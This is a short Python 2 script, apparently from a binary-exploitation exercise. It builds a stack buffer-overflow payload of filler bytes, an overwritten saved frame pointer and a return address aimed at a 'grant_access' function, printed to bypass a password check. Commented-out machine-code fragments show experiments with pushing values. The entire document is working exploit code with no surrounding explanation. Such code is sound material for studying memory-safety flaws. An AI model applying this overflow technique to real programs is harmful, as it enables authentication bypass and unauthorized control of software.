import struct

preamble = "AABBCCDDEEFFGGHHIIJJ"# * 20 

ebp = struct.pack("I",0x804932c) #returning point end of the pass_prompt
ebp = struct.pack("I",0xffefffd8) #same as gdb before calling it
eip= struct.pack("I", 0x080492a2) #'\xa2\x92\x04\x08' grant_access_address
edx = "\xE8\x03\x00\x00"
c=edx
#\xC3 #ret
#"\xFF\x35\x00\x00\x00\x00" #push $edx
#"\xC7\x45\xF4\x80\x3E\x00\x00\xFF\x75\xF4" 
#push [0x3e8] "\xFF\x35\xE8\x03\x00\x00" 
#struct.pack("I", 0x68E80300) 
#old push DWORD PTR 0x3e8 "\x68\xE8\x03\x00\x00"
print preamble + ebp + eip 
